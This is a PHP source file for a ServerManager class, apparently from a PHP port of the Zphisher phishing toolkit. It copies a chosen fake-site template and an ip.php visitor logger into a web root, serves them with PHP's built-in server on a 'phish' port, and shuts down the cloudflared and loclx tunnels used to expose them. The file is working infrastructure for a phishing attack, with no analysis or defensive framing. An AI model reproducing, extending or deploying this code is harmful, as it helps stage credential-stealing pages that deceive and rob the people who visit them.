<?php
declare(strict_types=1);

final class ServerManager
{
    public static function setupSite(string $website): array
    {
        $source = SITES_DIR . DIRECTORY_SEPARATOR . $website;
        if (!is_dir($source)) {
            return ['ok' => false, 'error' => "Template not found: $website"];
        }

        if (is_dir(WWW_DIR)) {
            self::removeDir(WWW_DIR);
        }
        mkdir(WWW_DIR, 0755, true);
        self::copyDir($source, WWW_DIR);
        copy(SITES_DIR . DIRECTORY_SEPARATOR . 'ip.php', WWW_DIR . DIRECTORY_SEPARATOR . 'ip.php');

        return ['ok' => true];
    }

    public static function startPhpServer(string $host, int $port): array
    {
        putenv('ZPHISHER_LAST_PORT=' . $port);
        self::stopPhpServerForPort($port);
        $php = ProcessHelper::phpBinary();
        $cmd = escapeshellarg($php) . ' -S ' . escapeshellarg($host . ':' . $port) . ' -t ' . escapeshellarg(WWW_DIR);
        $result = ProcessHelper::startBackground($cmd, WWW_DIR);
        sleep(1);
        if (!self::isPortListening($host, $port)) {
            return ['ok' => false, 'error' => "PHP server failed to start on $host:$port"];
        }
        $pid = $result['pid'] ?? ProcessHelper::findPidOnPort($port);
        if ($pid) {
            ProcessHelper::writePid(PID_PHP, $pid);
        }
        return ['ok' => true, 'url' => "http://$host:$port"];
    }

    public static function stopPhpServerForPort(int $port): void
    {
        $pid = ProcessHelper::readPid(PID_PHP);
        ProcessHelper::kill($pid);
        @unlink(PID_PHP);
        $portPid = ProcessHelper::findPidOnPort($port);
        if ($portPid) {
            ProcessHelper::kill($portPid);
        }
    }

    public static function stopPhpServer(): void
    {
        $port = (int) (getenv('ZPHISHER_LAST_PORT') ?: DEFAULT_PHISH_PORT);
        self::stopPhpServerForPort($port);
    }

    public static function stopAll(): void
    {
        self::stopPhpServer();
        TunnelManager::stopCloudflared();
        TunnelManager::stopLoclx();
    }

    public static function isPortListening(string $host, int $port): bool
    {
        $errno = 0;
        $errstr = '';
        $socket = @fsockopen($host, $port, $errno, $errstr, 2);
        if ($socket) {
            fclose($socket);
            return true;
        }
        return false;
    }

    private static function copyDir(string $src, string $dst): void
    {
        $dir = opendir($src);
        if ($dir === false) {
            return;
        }
        while (($file = readdir($dir)) !== false) {
            if ($file === '.' || $file === '..') {
                continue;
            }
            $from = $src . DIRECTORY_SEPARATOR . $file;
            $to = $dst . DIRECTORY_SEPARATOR . $file;
            if (is_dir($from)) {
                if (!is_dir($to)) {
                    mkdir($to, 0755, true);
                }
                self::copyDir($from, $to);
            } else {
                copy($from, $to);
            }
        }
        closedir($dir);
    }

    private static function removeDir(string $dir): void
    {
        if (!is_dir($dir)) {
            return;
        }
        $items = scandir($dir);
        if ($items === false) {
            return;
        }
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') {
                continue;
            }
            $path = $dir . DIRECTORY_SEPARATOR . $item;
            if (is_dir($path)) {
                self::removeDir($path);
            } else {
                @unlink($path);
            }
        }
        @rmdir($dir);
    }
}
